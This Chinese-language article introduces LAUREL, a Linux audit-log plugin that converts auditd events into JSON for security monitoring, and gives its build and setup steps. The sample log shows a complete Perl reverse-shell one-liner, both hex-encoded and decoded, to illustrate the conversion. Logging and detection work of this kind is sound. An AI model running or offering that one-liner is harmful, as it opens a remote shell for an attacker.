![](https://image.3001.net/images/20220818/1660787804_62fd9c5ce300001130403.png!small)

## 关于LAUREL

LAUREL是一款功能强大的Linus事件日志处理插件，可以帮助广大研究人员处理Linux系统事件日志，并对其进行后续处理，以便将日志应用到其他现代安全监控系统之中。

一般来说，Linux审计系统生成的日志文件会包含大量有价值的信息，特别适用于SIEM上下文中。但是原始的日志格式不适用于大规模分析，因为事件通常被分割成不同的行，必须使用消息标识符进行合并。文件和程序执行是通过PATH和EXECVE元素记录的，但字符串的有限字符集将导致许多条目采用十六进制编码。

LAUREL会对这些数据进行解析，并将其转换为基于JSON的日志格式，同时保留原始审计日志中的所有信息。

 **原始审计事件日志格式如下** ：

    
    
    type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…

 **将其转换为JSON格式后如下** ：

    
    
    { … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}

## 工具安装

### 源码构建

LAUREL基于Rust开发，如需构建项目源码，首先需要在本地设备上安装并配置好一个Rust编译器，以及cargo、libacl库及其头文件（Debian：libacl1-dev，RedHat：libacl-devel）。

首先，使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/threathunters-io/laurel.git

接下来，运行下列命令即可构建项目代码：

    
    
    $ cargo build --release
    
    $ sudo install -m755 target/release/laurel /usr/local/sbin/laurel

## 工具配置&使用

创建一个专用用户：

    
    
    $ sudo useradd --system --home-dir /var/log/laurel --create-home _laurel

配置LAUREL：将项目提供的带注释[ _示例文件_](https://github.com/threathunters-io/laurel/blob/master/etc/laurel/config.toml)拷贝到/etc/laurel/config.toml，并对其进行自定义配置。

将LAUREL注册为一个audisp插件：将提供的[ _示例文件_](https://github.com/threathunters-io/laurel/blob/master/etc/audit/plugins.d/laurel.conf)拷贝到/etc/audisp/plugins.d/laurel.conf或/etc/audit/plugins.d/laurel.conf，具体取决于审计器版本。

如果你使用的是SELinux，则需要编译策略文件并将其安装到运行的内核中：

    
    
    $ make -C contrib/selinux
    
    $ sudo semodule -i contrib/selinux/laurel.pp
    
    $ sudo restorecon -v -R -F /usr/local/sbin/laurel /etc/laurel /var/log/laurel

最后，部署并应用配置：

    
    
    $ sudo pkill -HUP auditd

## 许可证协议

本项目的开发与发布遵循[ _GPL_ _-3.0_](https://github.com/threathunters-io/laurel/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **LAUREL** ：【[ _GitHub传送门_](https://github.com/threathunters-io/laurel)】

## 参考资料

> [ _https://github.com/threathunters-io/laurel/blob/master/practical-auditd-> problems.md_](https://github.com/threathunters-> io/laurel/blob/master/practical-auditd-problems.md)
>
> [ _https://github.com/threathunters-io/laurel/blob/master/json-> format.md_](https://github.com/threathunters-io/laurel/blob/master/json-> format.md)
>
> [ _https://github.com/threathunters-> io/laurel/blob/master/performance.md_](https://github.com/threathunters-> io/laurel/blob/master/performance.md)
>
> [ _https://github.com/Neo23x0/auditd_](https://github.com/Neo23x0/auditd)

